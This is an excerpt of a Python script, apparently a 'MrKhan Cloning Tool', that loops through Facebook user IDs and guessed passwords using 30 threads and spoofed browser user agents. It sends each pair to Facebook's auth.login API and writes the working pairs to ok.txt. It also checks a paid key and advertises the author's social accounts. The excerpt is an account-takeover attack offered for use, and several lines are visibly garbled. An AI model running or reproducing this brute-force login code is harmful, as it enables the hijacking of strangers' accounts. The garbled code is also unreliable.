...
|____| \|____|'|____|/\|____|‘'|____|/\|____|° |____| '\|____ | 
 ...
 class Main: 
         def __init__(self): 
                 ...
                 self.loop = 0 
                 try: 
                         plr = requests.get('https://github.com/MRMIHAZ/Akhi.git').text 
                         if basesplit in plr: 
                                 key = basesplit 
...
|____| \|____|'|____|/\|____|‘'|____|/\|____|° |____| '\|____ | 
 ...
 \t\033[1;97m[\x1b[1;97m\x1b[1;41m Github   : www.gitclone//github.com/Mr-Khan-xd \x1b[0m\x1b[1;97m] 
 \t\033[1;97m[\x1b[1;97m\x1b[1;41m Facebook : www.facebook./Mr-Khan-xd \x1b[0m\x1b[1;97m] 
 ───────────────────────────────────────────────────────×  
     """) 
                 print("%s [%s•%s] %sTOOL NAME : %sMrKhan Cloning Tool"%(G,R,G,B,G)) 
                 print("%s [%s•%s] %sVERSION   : %s1"%(G,R,G,B,G)) 
                 print("%s [%s•%s] %sYOUR KEY  : %s%s"%(G,R,G,B,G,key)) 
                 print("%s [%s•%s] %sSTATUS    : %s"%((PAID))  
                 print("───────────────────────────────────────────────────────× ") 
                 print(" \t\033[1;97m[\x1b[1;97m\x1b[1;41m\x1b[0m\x1b[1;97m] \033[1;37m ") 
                 subprocess.check_output(["am", "start", "https://www.mbasic.facebook.com/profile.php?id=100092701149489"]) 
                 print("───────────────────────────────────────────────────────× ") 
         ...
         def fbtua(self): 
                 ...
                 try: 
                         ...
                         with ThreadPoolExecutor(max_workers=30) as coeg: 
                                 ...
                                 print("\033[0;92m[=×>]\033[0;92m NOTE : PAIT TOOL") 
                                 print("\033[0;92m[=×>]\033[0;92m NOTE : BRO 5 MIN AIRPLAN MOD/FLIGHT ") 
                                 print("\033[0;97m───────────────────────────────────────────────────────× ") 
                                 for user in self.id: 
  ...
  'Mozilla/5.0 (Linux; Android 10; SAMSUNG SM-G977N/KSU4CTG1) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/12.1 Chrome/79.0.3945.136 Mobile Safari/537.36' 
   ...
   'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:79.0) Gecko/20100101 Firefox/79.0' 
    ...
    'viewport-width': '980',
                         ...
                         response = ses.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(uid)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchrequests.get('https://developers.facebook.com/', cookies=cookies, headers=headers)
                         if "session_key" in response.text and "EAAA" in response.text: 
                                 print("\r  \033[0;97m   [=Khan=OK=>] %s | %s\033[0;97m         "%(uid, pw)) 
                                 self.ok.append("%s|%s"%(uid, pw)) 
                                 open("ok.txt","a").write("   [=Mr Khan=OK=>]  %s|%s\n"%(uid, pw)) 
                                 break 
                         elif "www.facebook.com" in response.json()["error_msg"]: 
                                 print("\r  \033[0;92m   [=Mr Khan=CP=>] %s | %s\033[0;97m         "%(uid, pw)) 
 ...
 if len(sys.argv) == 2: 
         if sys.argv[1] == "--info": 
                 ...
                 print(" [*] Team      :  \n") Mr Khan
                 print(" [ Sosial Khan  ] \n") 
                 print(" [*] Facebook  : https://www.facebook.com/profile.php?id=100088331583368") 
                 print(" [*] Instagram : https://instagram.com/ ") 
                 print(" [*] YouTube   : https://https://www.youtube.com/@MinhazulIslam-qi2tn") 
